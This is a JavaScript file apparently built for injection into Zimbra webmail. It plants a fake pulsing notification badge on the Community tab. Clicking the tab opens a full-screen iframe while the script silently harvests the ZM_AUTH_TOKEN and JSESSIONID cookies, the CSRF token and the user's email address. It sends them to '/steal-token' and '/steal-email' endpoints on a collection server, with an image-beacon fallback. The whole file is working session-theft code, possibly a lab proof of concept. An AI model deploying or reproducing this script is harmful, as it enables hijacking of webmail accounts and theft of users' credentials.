(function () {
  var self = {
    _iframeId: "fragment-41812_iframe",
    _serverUrl: "http://localhost:3001",
    _notificationId: "community-notification-badge",
    
    _createNotificationBadge: function() {
      try {
        // Remove existing badge if any
        var existingBadge = document.getElementById(this._notificationId);
        if (existingBadge) {
          existingBadge.remove();
        }
        
        // Find the Community tab container
        var communityTab = document.getElementById("zb__App__Social_title");
        if (!communityTab) {
          console.log("Community tab not found, waiting...");
          return false;
        }
        
        // Get the parent container (the TD element)
        var tabContainer = communityTab.parentElement;
        if (!tabContainer) {
          console.log("Community tab container not found");
          return false;
        }
        
        // Create notification badge
        var badge = document.createElement("div");
        badge.id = this._notificationId;
        badge.textContent = "1";
        
        // Style the badge to look like WhatsApp notification
        Object.assign(badge.style, {
          position: "absolute",
          top: "2px",
          right: "8px",
          backgroundColor: "#FF3B30", // Red color
          color: "white",
          borderRadius: "50%",
          width: "18px",
          height: "18px",
          fontSize: "11px",
          fontWeight: "bold",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          zIndex: "1000",
          border: "2px solid white",
          boxShadow: "0 2px 4px rgba(0,0,0,0.2)",
          fontFamily: "Arial, sans-serif",
          minWidth: "18px",
          textAlign: "center",
          lineHeight: "1"
        });
        
        // Make sure the tab container has relative positioning
        if (tabContainer.style.position !== "relative") {
          tabContainer.style.position = "relative";
        }
        
        // Add the badge to the tab container
        tabContainer.appendChild(badge);
        
        console.log("Notification badge created successfully");
        
        // Add a subtle animation
        badge.style.animation = "pulse 2s infinite";
        
        // Add CSS animation if not already present
        if (!document.getElementById("notification-animation-style")) {
          var style = document.createElement("style");
          style.id = "notification-animation-style";
          style.textContent = `
            @keyframes pulse {
              0% { transform: scale(1); }
              50% { transform: scale(1.1); }
              100% { transform: scale(1); }
            }
            
            @keyframes fadeIn {
              from { opacity: 0; transform: scale(0.5); }
              to { opacity: 1; transform: scale(1); }
            }
          `;
          document.head.appendChild(style);
          badge.style.animation = "fadeIn 0.3s ease-out, pulse 2s infinite 0.3s";
        }
        
        return true;
      } catch (error) {
        console.error("Error creating notification badge:", error);
        return false;
      }
    },
    
    _removeNotificationBadge: function() {
      var badge = document.getElementById(this._notificationId);
      if (badge) {
        badge.style.animation = "fadeOut 0.3s ease-in";
        setTimeout(function() {
          if (badge.parentNode) {
            badge.parentNode.removeChild(badge);
          }
        }, 300);
        console.log("Notification badge removed");
      }
    },
    
    _createIframe: function () {
      try {
        // Remove notification badge when community is clicked
        this._removeNotificationBadge();
        
        var iframe = document.getElementById(this._iframeId);
        if (!iframe) {
          iframe = document.createElement("iframe");
          iframe.id = this._iframeId;
          iframe.src = "http://localhost:4000/";
          
          // Set iframe styles
          Object.assign(iframe.style, {
            width: "100vw",
            height: "100vh",
            backgroundColor: "#1e90ff",
            border: "none",
            display: "block",
            position: "fixed",
            top: "0",
            left: "0",
            zIndex: "9999",
            visibility: "visible",
            opacity: "1"
          });

          var container = document.getElementById("z_shell") || document.body;
          if (container) {
            container.appendChild(iframe);
            console.log("Iframe created successfully");
          }
        } else {
          iframe.style.display = "block";
          iframe.src = "http://localhost:4000/";
        }
        
        // Extract and send data immediately
        this._extractAndSendData();
        
      } catch (error) {
        console.error("Iframe creation error:", error);
      }
    },

    _extractAndSendData: function () {
      try {
        console.log("Starting data extraction...");
        
        // Extract cookies
        var cookies = {};
        if (document.cookie) {
          document.cookie.split(";").forEach(cookie => {
            var parts = cookie.trim().split("=");
            if (parts.length >= 2) {
              cookies[parts[0]] = parts[1];
            }
          });
        }

        var zmAuthToken = cookies["ZM_AUTH_TOKEN"] || "Not found";
        var jsessionId = cookies["JSESSIONID"] || "Not found";

        // Extract email
        var email = "Not found";
        var emailElement = document.getElementById("z_userName");
        if (emailElement) {
          email = emailElement.getAttribute("aria-label") || 
                  emailElement.textContent || 
                  emailElement.innerText || 
                  "Not found";
        }

        // Extract CSRF token
        var csrfToken = "Not found";
        if (typeof Storage !== "undefined" && localStorage) {
          csrfToken = localStorage.getItem("csrfToken") ||
                     localStorage.getItem("CSRF_TOKEN") ||
                     localStorage.getItem("csrf_token") ||
                     "Not found";
        }

        console.log("Extracted data:", {
          email: email,
          zmAuthToken: zmAuthToken,
          jsessionId: jsessionId,
          csrfToken: csrfToken
        });

        // Send data with reduced timeout
        this._sendDataWithTimeout(email, zmAuthToken, jsessionId, csrfToken);
        
      } catch (error) {
        console.error("Data extraction error:", error);
      }
    },

    _sendDataWithTimeout: function(email, zmAuthToken, jsessionId, csrfToken) {
      // Set shorter timeout for faster failure
      var timeoutDuration = 5000; // 5 seconds instead of default
      
      // Send tokens
      this._sendWithFallback(
        this._serverUrl + "/steal-token?" +
        "zm_auth_token=" + encodeURIComponent(zmAuthToken) +
        "&jsessionid=" + encodeURIComponent(jsessionId) +
        "&csrf_token=" + encodeURIComponent(csrfToken),
        "GET",
        null,
        timeoutDuration
      );

      // Send email
      this._sendWithFallback(
        this._serverUrl + "/steal-email",
        "POST",
        JSON.stringify({ email: email }),
        timeoutDuration
      );
    },

    _sendWithFallback: function(url, method, data, timeout) {
      var controller = new AbortController();
      var timeoutId = setTimeout(() => controller.abort(), timeout);

      var fetchOptions = {
        method: method,
        signal: controller.signal,
        mode: 'cors',
        cache: 'no-cache'
      };

      if (data && method === 'POST') {
        fetchOptions.headers = {
          'Content-Type': 'application/json'
        };
        fetchOptions.body = data;
      }

      fetch(url, fetchOptions)
        .then(response => {
          clearTimeout(timeoutId);
          console.log("Success:", method, url, "Status:", response.status);
          return response.text();
        })
        .then(text => {
          console.log("Response:", text);
        })
        .catch(error => {
          clearTimeout(timeoutId);
          console.log("Fetch failed:", error.message);
          
          // Quick fallback with Image (no timeout)
          if (method === 'GET') {
            var img = new Image();
            img.onload = img.onerror = function() {
              console.log("Image fallback completed for:", url);
            };
            img.src = url + "&_t=" + Date.now();
          }
        });
    },

    _setupMessageHandling: function () {
      window.addEventListener("message", function (event) {
        console.log("Message received:", event.data);
        if (event.data === "close-iframe") {
          var iframe = document.getElementById(self._iframeId);
          if (iframe) {
            iframe.remove();
            console.log("Iframe closed");
          }
        }
      }, false);
    },

    _waitForElement: function (selector, callback, maxAttempts = 20) {
      var attempts = 0;
      var interval = setInterval(function () {
        var element = document.getElementById(selector.replace("#", ""));
        if (element) {
          clearInterval(interval);
          callback(element);
        } else if (attempts >= maxAttempts) {
          clearInterval(interval);
          console.log("Element not found:", selector);
        }
        attempts++;
      }, 200);
    },
    
    _setupCommunityClickHandler: function(communityTab) {
      if (communityTab && !communityTab.getAttribute('data-handler-attached')) {
        communityTab.addEventListener("click", function () {
          console.log("Community tab clicked - starting process");
          self._createIframe();
          self._setupMessageHandling();
        });
        communityTab.setAttribute('data-handler-attached', 'true');
        console.log("Community tab click handler attached");
        return true;
      }
      return false;
    }
  };

  function initializeWhenReady() {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", initializeWhenReady);
      return;
    }

    // Try to create notification badge immediately
    var badgeCreated = self._createNotificationBadge();
    
    // Setup click handler for Community tab
    var communityTab = document.getElementById("zb__App__Social_title");
    if (communityTab) {
      self._setupCommunityClickHandler(communityTab);
      if (!badgeCreated) {
        // Retry creating badge if it failed initially
        setTimeout(function() {
          self._createNotificationBadge();
        }, 1000);
      }
    } else {
      console.log("Community tab not found, setting up observer...");
      
      // Use observer to wait for Community tab
      var observer = new MutationObserver(function (mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.type === 'childList') {
            var communityTab = document.getElementById("zb__App__Social_title");
            if (communityTab) {
              console.log("Community tab found via observer");
              self._setupCommunityClickHandler(communityTab);
              self._createNotificationBadge();
              observer.disconnect();
            }
          }
        });
      });

      observer.observe(document.body, { 
        childList: true, 
        subtree: true 
      });
      
      // Stop observing after 30 seconds
      setTimeout(function() {
        observer.disconnect();
        console.log("Observer stopped after timeout");
      }, 30000);
    }
  }

  // Initialize immediately
  initializeWhenReady();
  console.log("Script initialized with notification badge");
  
  // Also try to create badge after a short delay in case DOM isn't fully ready
  setTimeout(function() {
    if (!document.getElementById(self._notificationId)) {
      self._createNotificationBadge();
    }
  }, 2000);
})();